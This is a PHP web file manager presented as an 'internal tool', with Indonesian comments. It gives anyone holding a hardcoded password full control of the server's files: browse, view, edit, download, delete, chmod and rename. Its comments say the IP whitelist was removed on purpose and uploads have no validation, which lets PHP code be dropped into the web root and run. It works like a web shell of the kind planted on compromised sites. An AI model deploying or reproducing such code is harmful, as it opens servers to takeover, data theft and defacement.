<?php
// ==============================================
// FILE MANAGEMENT SYSTEM - INTERNAL TOOLS
// ==============================================

// Security Configuration
$AUTH_USER = 'admin';
$AUTH_PASS = 'MySecurePassword123!';

// Additional Security
$ALLOWED_IPS = []; // Dikosongkan: IP Whitelist telah dihapus, akses dari mana pun diizinkan.
$RESTRICTED_DIRS = ['/etc', '/root', '/proc', '/sys', '/var/log'];

// Security headers
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");
header("X-XSS-Protection: 1; mode=block");

// Start session for login system
session_start();

// Rate limiting
if (isset($_SESSION['last_request'])) {
    $elapsed = microtime(true) - $_SESSION['last_request'];
    if ($elapsed < 0.5) { // Minimal 0.5 detik antara request
        usleep(500000);
    }
}
$_SESSION['last_request'] = microtime(true);

// ==============================================
// SECURITY FUNCTIONS
// ==============================================

function verifyAccess() {
    global $AUTH_USER, $AUTH_PASS; 
    
    // Check if user is already logged in
    if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
        return;
    }
    
    // Check login credentials if form was submitted
    if (isset($_POST['login'])) {
        // PERBAIKAN FLEKSIBILITAS: Mengganti ?? dengan isset()
        $username = isset($_POST['username']) ? $_POST['username'] : ''; 
        $password = isset($_POST['password']) ? $_POST['password'] : '';
        
        if ($username === $AUTH_USER && $password === $AUTH_PASS) {
            $_SESSION['loggedin'] = true;
            $_SESSION['username'] = $username;
            $_SESSION['login_time'] = time();
            return;
        } else {
            $error = "Invalid username or password";
            // Tambahkan delay untuk brute force protection
            sleep(2);
        }
    }
    
    // Show login form if not authenticated
    // PERBAIKAN: Mengganti ?? dengan isset() untuk $error
    displayLoginForm(isset($error) ? $error : '');
    exit;
}

function displayLoginForm($error = '') {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>File Management System</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #f5f5f5;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .login-container {
                background: white;
                padding: 30px;
                border-radius: 8px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                width: 300px;
            }
            .login-container h2 {
                margin-top: 0;
                color: #333;
                text-align: center;
            }
            .form-group {
                margin-bottom: 15px;
            }
            .form-group label {
                display: block;
                margin-bottom: 5px;
                color: #555;
            }
            .form-group input {
                width: 100%;
                padding: 8px;
                border: 1px solid #ddd;
                border-radius: 4px;
                box-sizing: border-box;
            }
            .login-btn {
                width: 100%;
                padding: 10px;
                background-color: #28a745;
                color: white;
                border: none;
                border-radius: 4px;
                cursor: pointer;
                font-size: 16px;
            }
            .login-btn:hover {
                background-color: #218838;
            }
            .error {
                color: red;
                text-align: center;
                margin-bottom: 15px;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h2>Login</h2>
            <?php if (!empty($error)): ?>
                <div class="error"><?php echo htmlspecialchars($error); ?></div>
            <?php endif; ?>
            <form method="post">
                <div class="form-group">
                    <label for="username">Username:</label>
                    <input type="text" id="username" name="username" required>
                </div>
                <div class="form-group">
                    <label for="password">Password:</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <button type="submit" name="login" class="login-btn">Login</button>
            </form>
        </div>
    </body>
    </html>
    <?php
}

function cleanPath($path) {
    global $RESTRICTED_DIRS;
    
    // Basic path traversal protection
    $path = str_replace(['../', '..\\', './', '.\\'], '', $path);
    
    // Resolve to absolute path
    $real_path = realpath($path);
    if ($real_path === false) {
        return getDefaultWebRoot();
    }
    
    // Check against restricted directories
    foreach ($RESTRICTED_DIRS as $restricted) {
        if (strpos($real_path, $restricted) === 0) {
            return getDefaultWebRoot();
        }
    }
    
    return $real_path;
}

// ==============================================
// MAIN FUNCTIONS
// ==============================================

function browseFolder($dir) {
    // Ensure directory exists and is readable
    if (!is_dir($dir) || !is_readable($dir)) {
        echo "<p style='color:red;'>Error: Cannot access directory '$dir'</p>";
        return;
    }
    
    echo "<h2>Login: " . htmlspecialchars($dir) . "</h2>";
    
    // Session info
    echo '<div style="margin-bottom:20px;padding:10px;background:#e9ecef;border-radius:4px;">';
    // PERBAIKAN FLEKSIBILITAS: Mengganti ?? dengan isset()
    echo 'Logged in as: <strong>' . htmlspecialchars(isset($_SESSION['username']) ? $_SESSION['username'] : 'Unknown') . '</strong> | ';
    echo 'IP: ' . htmlspecialchars($_SERVER['REMOTE_ADDR']) . ' | ';
    echo '<form method="post" style="display:inline;">';
    echo '<input type="submit" name="logout" value="Logout" style="background:#dc3545;color:white;border:none;padding:3px 8px;border-radius:3px;cursor:pointer;margin-left:10px;">';
    echo '</form>';
    echo '</div>';
    
    // Navigation buttons
    echo '<div style="margin-bottom:20px;">';
    if ($dir !== '/' && $dir !== '\\' && dirname($dir) !== $dir) {
        echo '<a href="?dir='.urlencode(dirname($dir)).'">[Parent Directory]</a> | ';
    }
    echo '<a href="?dir=/">[Root Directory]</a>';
    echo '</div>';
    
    // File operations panel
    echo '<div style="background:#f8f9fa; padding:15px; margin-bottom:20px; border:1px solid #dee2e6; border-radius:4px;">';
    echo '<h3 style="margin-top:0;">File Operations</h3>';
    
    // Upload form
    echo '<form method="post" enctype="multipart/form-data" style="margin-bottom:10px;">';
    echo 'Upload File: <input type="file" name="fileToUpload"> ';
    echo '<input type="hidden" name="currentDir" value="'.htmlspecialchars($dir).'">';
    echo '<input type="submit" name="upload" value="Upload" style="background:#28a745;color:white;border:none;padding:5px 10px;border-radius:3px;cursor:pointer;">';
    echo '</form>';
    
    // Create directory form
    echo '<form method="post" style="margin-bottom:10px;">';
    echo 'Create Directory: <input type="text" name="newDirName" placeholder="Directory name"> ';
    echo '<input type="hidden" name="currentDir" value="'.htmlspecialchars($dir).'">';
    echo '<input type="submit" name="createDir" value="Create" style="background:#17a2b8;color:white;border:none;padding:5px 10px;border-radius:3px;cursor:pointer;">';
    echo '</form>';
    
    // Create file form
    echo '<form method="post">';
    echo 'Create File: <input type="text" name="newFileName" placeholder="File name"> ';
    echo '<input type="hidden" name="currentDir" value="'.htmlspecialchars($dir).'">';
    echo '<input type="submit" name="createFile" value="Create" style="background:#ffc107;color:black;border:none;padding:5px 10px;border-radius:3px;cursor:pointer;">';
    echo '</form>';
    echo '</div>';
    
    // List files
    $files = @scandir($dir);
    if ($files === false) {
        echo "<p style='color:red;'>Error: Cannot read directory contents</p>";
        return;
    }
    
    echo '<table border="1" cellpadding="8" style="width:100%; border-collapse:collapse; border-color:#dee2e6;">';
    echo '<tr style="background:#007bff;color:white;"><th>Name</th><th>Type</th><th>Size</th><th>Permissions</th><th>Modified</th><th>Actions</th></tr>';
    
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') continue;
        
        $fullpath = rtrim($dir, '/') . '/' . $file;
        $isDir = @is_dir($fullpath);
        
        echo '<tr style="background:white;">';
        echo '<td>';
        if ($isDir) {
            echo '<strong><a href="?dir='.urlencode($fullpath).'" style="color:#007bff;">'.htmlspecialchars($file).'/</a></strong>';
        } else {
            echo htmlspecialchars($file);
        }
        echo '</td>';
        
        echo '<td>'.($isDir ? '📁 Directory' : '📄 File').'</td>';
        
        echo '<td>';
        if (!$isDir) {
            $size = @filesize($fullpath);
            echo $size !== false ? formatFileSize($size) : 'N/A';
        } else {
            echo '-';
        }
        echo '</td>';
        
        echo '<td style="font-family:monospace;">';
        $perms = @fileperms($fullpath);
        echo $perms !== false ? substr(sprintf('%o', $perms), -4) : 'N/A';
        echo '</td>';
        
        echo '<td>';
        $mtime = @filemtime($fullpath);
        echo $mtime !== false ? date("Y-m-d H:i", $mtime) : 'N/A';
        echo '</td>';
        
        echo '<td>';
        if (!$isDir) {
            echo '<a href="?view='.urlencode($fullpath).'&dir='.urlencode($dir).'" style="color:#28a745;">View</a> | ';
            echo '<a href="?edit='.urlencode($fullpath).'&dir='.urlencode($dir).'" style="color:#ffc107;">Edit</a> | ';
            echo '<a href="?download='.urlencode($fullpath).'" style="color:#17a2b8;">Download</a> | ';
        }
        echo '<a href="?dir='.urlencode($dir).'&delete='.urlencode($fullpath).'" onclick="return confirm(\'Are you sure?\')" style="color:#dc3545;">Delete</a>';
        echo ' | <a href="?dir='.urlencode($dir).'&chmod='.urlencode($fullpath).'" style="color:#6c757d;">Chmod</a>';
        echo ' | <a href="#" onclick="showRenameForm(\''.htmlspecialchars($fullpath).'\', \''.htmlspecialchars($file).'\')" style="color:#6f42c1;">Rename</a>';
        echo '</td>';
        
        echo '</tr>';
    }
    
    echo '</table>';
    
    // Rename form (hidden by default)
    echo '<div id="renameForm" style="display:none; background:#f8f9fa; padding:15px; margin-top:15px; border:1px solid #dee2e6; border-radius:4px;">';
    echo '<h3 style="margin-top:0;">Rename File/Folder</h3>';
    echo '<form method="post">';
    echo 'Current path: <span id="currentPath" style="font-family:monospace;"></span><br>';
    echo 'New name: <input type="text" id="newName" name="newName" style="margin:5px 0;"> ';
    echo '<input type="hidden" id="renameTarget" name="renameTarget">';
    echo '<input type="hidden" name="currentDir" value="'.htmlspecialchars($dir).'">';
    echo '<input type="submit" name="rename" value="Rename" style="background:#28a745;color:white;border:none;padding:5px 10px;border-radius:3px;cursor:pointer;"> ';
    echo '<button type="button" onclick="hideRenameForm()" style="background:#6c757d;color:white;border:none;padding:5px 10px;border-radius:3px;cursor:pointer;">Cancel</button>';
    echo '</form>';
    echo '</div>';
    
    // JavaScript for rename functionality
    echo '<script>
    function showRenameForm(path, currentName) {
        document.getElementById("renameForm").style.display = "block";
        document.getElementById("currentPath").textContent = path;
        document.getElementById("renameTarget").value = path;
        document.getElementById("newName").value = currentName;
        document.getElementById("newName").focus();
    }
    function hideRenameForm() {
        document.getElementById("renameForm").style.display = "none";
    }
    </script>';
}

function formatFileSize($bytes) {
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } else {
        return $bytes . ' bytes';
    }
}

// ==============================================
// REQUEST PROCESSING
// ==============================================

verifyAccess();

// Handle logout
if (isset($_POST['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Function to get default web root directory
function getDefaultWebRoot() {
    $possibleRoots = [
        // PERBAIKAN: Mengganti Ternary Operator ?: dengan isset()
        isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '/var/www/html',
        '/var/www/html',
        '/var/www',
        '/usr/local/apache2/htdocs',
        '/srv/http',
        // PERBAIKAN: Mengganti Ternary Operator ?: dengan isset()
        (getcwd() !== false) ? getcwd() : '/tmp'
    ];
    
    foreach ($possibleRoots as $root) {
        if (is_dir($root) && is_readable($root)) {
            return $root;
        }
    }
    
    return '/tmp';
}

// Set current directory
if (!isset($_GET['dir']) || empty($_GET['dir'])) {
    $currentDir = getDefaultWebRoot();
} else {
    $currentDir = cleanPath($_GET['dir']);
    
    if (!is_dir($currentDir)) {
        $currentDir = getDefaultWebRoot();
    }
}

// Handle file upload - TANPA VALIDASI
if (isset($_POST['upload']) && isset($_FILES['fileToUpload'])) {
    // PERBAIKAN FLEKSIBILITAS: Mengganti ?? dengan isset()
    $targetDir = cleanPath(isset($_POST['currentDir']) ? $_POST['currentDir'] : getDefaultWebRoot());
    $targetFile = rtrim($targetDir, '/') . '/' . basename($_FILES['fileToUpload']['name']);
    
    if ($_FILES['fileToUpload']['error'] === UPLOAD_ERR_OK) {
        if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $targetFile)) {
            echo '<div style="background:#d4edda;color:#155724;padding:10px;margin:10px 0;border:1px solid #c3e6cb;border-radius:4px;">File uploaded successfully</div>';
        } else {
            echo '<div style="background:#f8d7da;color:#721c24;padding:10px;margin:10px 0;border:1px solid #f5c6cb;border-radius:4px;">Error uploading file</div>';
        }
    } else {
        echo '<div style="background:#f8d7da;color:#721c24;padding:10px;margin:10px 0;border:1px solid #f5c6cb;border-radius:4px;">Upload error: ' . $_FILES['fileToUpload']['error'] . '</div>';
    }
}

// Handle directory creation
if (isset($_POST['createDir']) && !empty($_POST['newDirName'])) {
    $targetDir = cleanPath(isset($_POST['currentDir']) ? $_POST['currentDir'] : getDefaultWebRoot());
    $newDir = rtrim($targetDir, '/') . '/' . preg_replace('/[^a-zA-Z0-9._-]/', '', $_POST['newDirName']);
    
    if (!file_exists($newDir)) {
        if (mkdir($newDir, 0755, true)) {
            echo '<div style="background:#d4edda;color:#155724;padding:10px;margin:10px 0;border:1px solid #c3e6cb;border-radius:4px;">Directory created successfully</div>';
        } else {
            echo '<div style="background:#f8d7da;color:#721c24;padding:10px;margin:10px 0;border:1px solid #f5c6cb;border-radius:4px;">Error creating directory</div>';
        }
    } else {
        echo '<div style="background:#fff3cd;color:#856404;padding:10px;margin:10px 0;border:1px solid #ffeaa7;border-radius:4px;">Directory already exists</div>';
    }
}

// Handle file creation
if (isset($_POST['createFile']) && !empty($_POST['newFileName'])) {
    $targetDir = cleanPath(isset($_POST['currentDir']) ? $_POST['currentDir'] : getDefaultWebRoot());
    $newFile = rtrim($targetDir, '/') . '/' . preg_replace('/[^a-zA-Z0-9._-]/', '', $_POST['newFileName']);
    
    if (!file_exists($newFile)) {
        if (file_put_contents($newFile, '') !== false) {
            echo '<div style="background:#d4edda;color:#155724;padding:10px;margin:10px 0;border:1px solid #c3e6cb;border-radius:4px;">File created successfully</div>';
        } else {
            echo '<div style="background:#f8d7da;color:#721c24;padding:10px;margin:10px 0;border:1px solid #f5c6cb;border-radius:4px;">Error creating file</div>';
        }
    } else {
        echo '<div style="background:#fff3cd;color:#856404;padding:10px;margin:10px 0;border:1px solid #ffeaa7;border-radius:4px;">File already exists</div>';
    }
}

// Handle file/folder rename
if (isset($_POST['rename']) && !empty($_POST['newName'])) {
    // PERBAIKAN FLEKSIBILITAS: Mengganti ?? dengan isset()
    $oldPath = cleanPath(isset($_POST['renameTarget']) ? $_POST['renameTarget'] : '');
    $newName = preg_replace('/[^a-zA-Z0-9._-]/', '', $_POST['newName']);
    $dir = dirname($oldPath);
    $newPath = rtrim($dir, '/') . '/' . $newName;
    
    if (file_exists($oldPath)) {
        if (rename($oldPath, $newPath)) {
            echo '<div style="background:#d4edda;color:#155724;padding:10px;margin:10px 0;border:1px solid #c3e6cb;border-radius:4px;">Renamed successfully</div>';
            if ($currentDir == $oldPath) {
                $currentDir = $newPath;
            }
        } else {
            echo '<div style="background:#f8d7da;color:#721c24;padding:10px;margin:10px 0;border:1px solid #f5c6cb;border-radius:4px;">Error renaming file/folder</div>';
        }
    } else {
        echo '<div style="background:#f8d7da;color:#721c24;padding:10px;margin:10px 0;border:1px solid #f5c6cb;border-radius:4px;">File/folder does not exist</div>';
    }
}

// Handle file deletion
if (isset($_GET['delete'])) {
    $fileToDelete = cleanPath($_GET['delete']);
    if (file_exists($fileToDelete)) {
        if (is_dir($fileToDelete)) {
            if (rmdir($fileToDelete)) {
                echo '<div style="background:#d4edda;color:#155724;padding:10px;margin:10px 0;border:1px solid #c3e6cb;border-radius:4px;">Directory deleted successfully</div>';
            } else {
                echo '<div style="background:#f8d7da;color:#721c24;padding:10px;margin:10px 0;border:1px solid #f5c6cb;border-radius:4px;">Error: Directory not empty or permission denied</div>';
            }
        } else {
            if (unlink($fileToDelete)) {
                echo '<div style="background:#d4edda;color:#155724;padding:10px;margin:10px 0;border:1px solid #c3e6cb;border-radius:4px;">File deleted successfully</div>';
            } else {
                echo '<div style="background:#f8d7da;color:#721c24;padding:10px;margin:10px 0;border:1px solid #f5c6cb;border-radius:4px;">Error deleting file</div>';
            }
        }
    } else {
        echo '<div style="background:#f8d7da;color:#721c24;padding:10px;margin:10px 0;border:1px solid #f5c6cb;border-radius:4px;">File/directory does not exist</div>';
    }
}

// Handle chmod
if (isset($_GET['chmod'])) {
    $target = cleanPath($_GET['chmod']);
    if (isset($_POST['newperms'])) {
        $perms = octdec($_POST['newperms']);
        if (chmod($target, $perms)) {
            echo '<div style="background:#d4edda;color:#155724;padding:10px;margin:10px 0;border:1px solid #c3e6cb;border-radius:4px;">Permissions changed successfully</div>';
        } else {
            echo '<div style="background:#f8d7da;color:#721c24;padding:10px;margin:10px 0;border:1px solid #f5c6cb;border-radius:4px;">Error changing permissions</div>';
        }
    } else {
        echo '<div style="background:#e2e3e5; padding:15px; margin:10px 0; border:1px solid #d6d8db; border-radius:4px;">';
        echo '<h3 style="margin-top:0;">Change Permissions</h3>';
        echo '<form method="post">';
        echo 'New permissions (octal): <input type="text" name="newperms" value="'.substr(sprintf('%o', fileperms($target)), -4).'">';
        echo '<input type="hidden" name="currentDir" value="'.htmlspecialchars($currentDir).'">';
        echo '<input type="submit" value="Apply" style="background:#28a745;color:white;border:none;padding:5px 10px;border-radius:3px;cursor:pointer;">';
        echo '</form>';
        echo '</div>';
    }
}

// Handle file editing
if (isset($_GET['edit'])) {
    $file = cleanPath($_GET['edit']);
    if (file_exists($file) && is_file($file)) {
        if (isset($_POST['content'])) {
            if (is_writable($file)) {
                if (file_put_contents($file, $_POST['content']) !== false) {
                    echo '<div style="background:#d4edda;color:#155724;padding:10px;margin:10px 0;border:1px solid #c3e6cb;border-radius:4px;">File saved successfully</div>';
                } else {
                    echo '<div style="background:#f8d7da;color:#721c24;padding:10px;margin:10px 0;border:1px solid #f5c6cb;border-radius:4px;">Error saving file</div>';
                }
            } else {
                echo '<div style="background:#f8d7da;color:#721c24;padding:10px;margin:10px 0;border:1px solid #f5c6cb;border-radius:4px;">Error: File is not writable</div>';
            }
        }
        
        echo '<div style="max-width:1200px;margin:0 auto;padding:20px;">';
        echo '<h3>Editing: ' . htmlspecialchars($file) . '</h3>';
        echo '<form method="post">';
        echo '<textarea name="content" style="width:100%;height:400px;font-family:monospace;padding:10px;border:1px solid #ddd;border-radius:4px;">' . htmlspecialchars(file_get_contents($file)) . '</textarea><br>';
        echo '<input type="hidden" name="currentDir" value="'.htmlspecialchars($currentDir).'">';
        echo '<input type="submit" value="Save Changes" style="background:#28a745;color:white;border:none;padding:8px 15px;border-radius:4px;cursor:pointer;">';
        echo ' <a href="?dir='.urlencode($currentDir).'" style="background:#6c757d;color:white;padding:8px 15px;text-decoration:none;border-radius:4px;display:inline-block;">Cancel</a>';
        echo '</form>';
        echo '</div>';
        exit;
    }
}

// View file content
if (isset($_GET['view'])) {
    $file = cleanPath($_GET['view']);
    if (file_exists($file) && is_file($file)) {
        echo '<div style="max-width:1200px;margin:0 auto;padding:20px;">';
        echo '<h3>Viewing: ' . htmlspecialchars($file) . '</h3>';
        echo '<div style="background:#f8f9fa;padding:15px;border:1px solid #dee2e6;border-radius:4px;">';
        echo '<pre style="white-space:pre-wrap;word-wrap:break-word;margin:0;">' . htmlspecialchars(file_get_contents($file)) . '</pre>';
        echo '</div>';
        echo '<br><a href="?dir='.urlencode($currentDir).'" style="background:#007bff;color:white;padding:8px 15px;text-decoration:none;border-radius:4px;display:inline-block;">Back to directory</a>';
        echo '</div>';
        exit;
    }
}

// Download file
if (isset($_GET['download'])) {
    $file = cleanPath($_GET['download']);
    if (file_exists($file) && is_file($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// Show main interface
echo '<div style="max-width:1400px;margin:0 auto;padding:20px;">';
browseFolder($currentDir);
echo '</div>';
?>